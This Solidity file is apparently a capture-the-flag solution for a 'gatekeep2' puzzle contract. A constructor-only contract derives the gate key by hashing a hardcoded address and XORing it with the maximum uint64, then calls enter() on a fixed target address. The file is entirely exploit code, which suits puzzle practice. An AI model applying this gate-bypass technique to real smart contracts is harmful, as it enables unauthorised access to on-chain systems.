// SPDX-License-Identifier: MIT
pragma solidity ^0.8.00;

interface gatekeep2{
    function enter(bytes8 _gateKey) external returns (bool);
}
contract attack{
    constructor(){
        gatekeep2 target = gatekeep2(0xd3BFeca875f689466C2f4cbC926dBc3Bc1096aC8);
        bytes8 key;

        unchecked{
            key = bytes8(uint64(bytes8 (keccak256(abi.encodePacked(address(0x89a91a6c91E6c11C229A3C314f25b42c42A8B9F1)))))^(uint64(0)-1));
        }
        target.enter(key);
    }
}